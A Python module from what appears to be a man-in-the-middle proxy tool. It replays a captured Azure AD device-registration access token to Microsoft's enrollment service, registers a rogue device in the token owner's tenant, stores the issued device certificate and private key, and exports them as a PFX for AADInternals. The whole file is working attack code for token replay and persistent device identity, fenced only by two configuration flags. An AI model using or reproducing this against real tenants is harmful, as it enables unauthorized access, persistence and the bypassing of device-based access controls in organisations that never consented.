"""Azure AD device registration replay.

Given a captured DRS-scoped access token (`aud=urn:ms-drs:...` /
resource ID `01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9`), this module:

1. Generates an RSA-2048 keypair locally.
2. Builds a CSR with the device's CN and the public key.
3. POSTs to `https://enterpriseregistration.windows.net/EnrollmentServer/device/?api-version=2.0`.
4. Stores the issued device cert + the local key as a new entry in
   `JsonStore("device_credentials")`. (Distinct from the Devices
   profile store — a *credential* is the IdP-issued cert+key pair.)

Operational guard: callers must pass `confirm=True` AND the operator
must have set `allow_drs_replay=true` in config (default: false).
Rationale: device registration mutates state on the IdP tenant — it
creates a new device in the directory. Doing this against a tenant
you don't own without authorization is unauthorized access. The
double gate makes accidental clicks impossible.

The result is a `device_credential` record:

```jsonc
{
  "id": "drs_<8-hex>",
  "name": "<DeviceDisplayName>",
  "tenant_id": "<tid from token>",
  "user_oid": "<oid from token>",
  "user_upn": "<upn / preferred_username from token>",
  "device_id": "<DeviceId from DRS response>",
  "membership_type": "<from response>",
  "registered_at": <epoch>,
  "join_type": <0 = AAD Join, 4 = Workplace Join>,
  "cert_pem": "<base64 PEM cert from DRS>",
  "key_pem":  "<base64 PEM private key — never leaves DATA_DIR>",
  "raw_response": {<full DRS JSON>}
}
```

The PFX is reproducible as `cryptography.hazmat.serialization.pkcs12`.
"""

from __future__ import annotations

import base64
import json
import re
import secrets
import time
from typing import Any
from urllib.parse import urlparse

import httpx

from backend.shared import append_log, get_config_value
from backend.store import JsonStore


credentials_store = JsonStore("device_credentials")

_DRS_AUD = "01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9"
_DRS_AUD_URN = "urn:ms-drs:enterpriseregistration.windows.net"
_DRS_ENDPOINT = (
    "https://enterpriseregistration.windows.net"
    "/EnrollmentServer/device/?api-version=2.0"
)


def _b64url_decode_payload(token: str) -> dict | None:
    """Decode a JWT payload — header + payload only, no signature
    check. Returns None on any parse failure."""
    if not token or "." not in token:
        return None
    parts = token.split(".")
    if len(parts) < 2:
        return None
    if not re.fullmatch(r"[A-Za-z0-9_\-]+", parts[1]):
        return None
    pad = "=" * (-len(parts[1]) % 4)
    try:
        return json.loads(base64.urlsafe_b64decode(
            parts[1] + pad).decode("utf-8", errors="replace"))
    except Exception:
        return None


def analyze_token(token: str) -> dict:
    """Inspect a captured access token. Returns claim summary +
    `valid_for_drs` flag indicating whether this token's audience is
    the device-registration service. Use this to populate the
    confirmation modal before registration."""
    payload = _b64url_decode_payload(token) or {}
    aud = payload.get("aud") or ""
    if isinstance(aud, list):
        aud_list = [str(a) for a in aud]
    else:
        aud_list = [str(aud)]
    valid_for_drs = any(
        _DRS_AUD in a or _DRS_AUD_URN in a for a in aud_list)
    now = int(time.time())
    exp = payload.get("exp")
    expires_in = (
        int(exp) - now if isinstance(exp, (int, float)) else None)
    return {
        "valid_for_drs": valid_for_drs,
        "aud": aud_list[0] if aud_list else "",
        "tid": payload.get("tid") or "",
        "oid": payload.get("oid") or "",
        "upn": (payload.get("upn") or payload.get("preferred_username")
                or payload.get("email") or ""),
        "iss": payload.get("iss") or "",
        "scp": payload.get("scp") or payload.get("scope") or "",
        "amr": payload.get("amr") or [],
        "exp": exp,
        "expires_in_secs": expires_in,
        "expired": (expires_in is not None and expires_in <= 0),
    }


def _new_id() -> str:
    return f"drs_{secrets.token_hex(4)}"


def _generate_keypair_and_csr(common_name: str) -> tuple[str, str, str]:
    """Generate an RSA-2048 keypair + a PKCS#10 CSR. Returns
    (private_key_pem, csr_b64_der, public_key_pem) — the b64 DER form
    is what the DRS endpoint expects in `CertificateRequest.Data`."""
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography import x509
    from cryptography.x509.oid import NameOID

    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    csr = (
        x509.CertificateSigningRequestBuilder()
        .subject_name(x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, common_name),
        ]))
        .sign(key, hashes.SHA256())
    )
    csr_der = csr.public_bytes(serialization.Encoding.DER)
    csr_b64 = base64.b64encode(csr_der).decode("ascii")
    private_pem = key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    ).decode("ascii")
    public_pem = key.public_key().public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    ).decode("ascii")
    return private_pem, csr_b64, public_pem


def _transport_key_b64(public_pem: str) -> str:
    """The TransportKey field expects a base64-encoded RSA public key
    in BCRYPT_RSAPUBLIC_BLOB form. For the operator-replay path the
    legacy PEM form works too — DRS accepts a base64 SPKI in newer
    API versions. We send the b64 SPKI bytes."""
    from cryptography.hazmat.primitives import serialization
    pub = serialization.load_pem_public_key(public_pem.encode("ascii"))
    der = pub.public_bytes(
        encoding=serialization.Encoding.DER,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    return base64.b64encode(der).decode("ascii")


async def attempt_registration(
    token: str, *,
    device_name: str = "",
    join_type: int = 0,
    os_version: str = "10.0.19045.0",
    confirm: bool = False,
) -> dict:
    """Replay a device registration against AAD DRS.

    Args:
        token: A DRS-scoped access token (`aud=01cb2876-...`).
        device_name: Friendly DisplayName. Auto-generated if empty.
        join_type: 0 = AAD Join, 4 = Workplace Join (BYOD/secondary).
        os_version: Reported OSVersion string.
        confirm: Caller must pass True to actually fire the request.

    Returns:
        `{ok, error?, credential?, http_status, drs_response?}`. When
        `ok` is True, `credential` is the persisted record.
    """
    if not get_config_value("allow_drs_replay", False):
        return {"ok": False, "error":
                ("allow_drs_replay is off — set it true in Settings "
                 "before attempting registration. Mutates IdP state.")}
    if not confirm:
        return {"ok": False, "error":
                ("confirm flag was not set — refusing to register. "
                 "This is a deliberate two-step gate.")}
    info = analyze_token(token)
    if not info["valid_for_drs"]:
        return {"ok": False, "error":
                f"token aud is {info['aud']!r} — not a DRS token. "
                f"Need aud={_DRS_AUD} or {_DRS_AUD_URN}."}
    if info["expired"]:
        return {"ok": False, "error":
                f"token expired ({-(info['expires_in_secs'] or 0)}s ago)"}

    common_name = device_name or f"replay-{secrets.token_hex(4)}"
    private_pem, csr_b64, public_pem = _generate_keypair_and_csr(common_name)
    transport_b64 = _transport_key_b64(public_pem)

    payload = {
        "CertificateRequest": {"Type": "pkcs10", "Data": csr_b64},
        "TransportKey": transport_b64,
        "TargetDomain": info["tid"] or "",
        "DeviceType": "Windows",
        "OSVersion": os_version,
        "DeviceDisplayName": common_name,
        "JoinType": int(join_type),
        "AikCertificate": "",
        "Attributes": {"ReuseDevice": "true",
                        "ReturnClientSid": "true"},
    }
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json; charset=utf-8",
        "ocp-adrs-client-name": "MITM-Proxy-Replay",
        "ocp-adrs-client-version": "1.0",
    }
    append_log("info", "drs_register",
               f"DRS_REGISTER_START name={common_name} tid={info['tid']} "
               f"upn={info['upn']} join_type={join_type}")
    try:
        async with httpx.AsyncClient(
                timeout=30.0, follow_redirects=False) as client:
            r = await client.post(_DRS_ENDPOINT, headers=headers,
                                   json=payload)
        body = None
        try:
            body = r.json()
        except Exception:
            body = {"_raw_text": r.text[:4000]}
    except Exception as e:
        append_log("warn", "drs_register",
                   f"DRS_REGISTER_NETERR {type(e).__name__}: {e}")
        return {"ok": False, "error": f"network: {type(e).__name__}: {e}"}

    if r.status_code >= 400:
        append_log("warn", "drs_register",
                   f"DRS_REGISTER_FAIL http={r.status_code} body="
                   f"{json.dumps(body)[:400]}")
        return {"ok": False, "http_status": r.status_code,
                "drs_response": body,
                "error": f"DRS returned {r.status_code}"}

    cert_pem = ""
    device_id = ""
    membership = ""
    if isinstance(body, dict):
        cert_b64 = (body.get("Certificate", {}) or {}).get("RawBody") or ""
        if cert_b64:
            try:
                der = base64.b64decode(cert_b64)
                cert_pem = (
                    "-----BEGIN CERTIFICATE-----\n"
                    + base64.encodebytes(der).decode("ascii")
                    + "-----END CERTIFICATE-----\n")
            except Exception:
                pass
        device_id = (
            body.get("Identifier")
            or (body.get("Device") or {}).get("DeviceId")
            or "")
        membership = (
            body.get("MembershipType")
            or (body.get("Device") or {}).get("MembershipType") or "")

    cred_id = _new_id()
    rec = {
        "id": cred_id,
        "name": common_name,
        "tenant_id": info["tid"],
        "user_oid": info["oid"],
        "user_upn": info["upn"],
        "device_id": device_id,
        "membership_type": membership,
        "registered_at": time.time(),
        "join_type": join_type,
        "os_version": os_version,
        "cert_pem": cert_pem,
        "key_pem": private_pem,
        "raw_response": body,
    }
    credentials_store.put(cred_id, rec)
    append_log("info", "drs_register",
               f"DRS_REGISTER_OK id={cred_id} device_id={device_id} "
               f"name={common_name} tid={info['tid']} "
               f"membership={membership}")
    return {"ok": True, "http_status": r.status_code,
            "credential": rec, "drs_response": body}


def list_credentials() -> list[dict]:
    out = credentials_store.list_all()
    out.sort(key=lambda c: c.get("registered_at") or 0, reverse=True)
    # Strip the private key from the listing — the operator opts in
    # to seeing it on the GET-by-id path.
    return [
        {**c, "key_pem": "<redacted — fetch /{id} to retrieve>"}
        for c in out
    ]


def get_credential(cred_id: str) -> dict | None:
    if not cred_id:
        return None
    return credentials_store.get(cred_id)


def delete_credential(cred_id: str) -> bool:
    return credentials_store.delete(cred_id)


def build_pfx(cred_id: str, password: str = "") -> bytes | None:
    """Bundle a credential's cert + key as a PKCS#12 (.pfx) archive
    for use with AADInternals / curl / openssl. Returns None when
    the credential or its key is missing.

    Pass `password=""` for an unprotected PFX (matches the AADInternals
    default); for anything sensitive the operator should supply one."""
    rec = credentials_store.get(cred_id)
    if not rec or not rec.get("cert_pem") or not rec.get("key_pem"):
        return None
    try:
        from cryptography.hazmat.primitives import serialization
        from cryptography.hazmat.primitives.serialization import pkcs12
        from cryptography import x509
        cert = x509.load_pem_x509_certificate(rec["cert_pem"].encode())
        key = serialization.load_pem_private_key(
            rec["key_pem"].encode(), password=None)
        if password:
            enc = serialization.BestAvailableEncryption(password.encode())
        else:
            enc = serialization.NoEncryption()
        return pkcs12.serialize_key_and_certificates(
            name=(rec.get("name") or rec["id"]).encode(),
            key=key, cert=cert, cas=None, encryption_algorithm=enc,
        )
    except Exception as e:
        from backend.shared import append_log
        append_log("warn", "drs_register",
                   f"PFX build failed for {cred_id}: {e}")
        return None
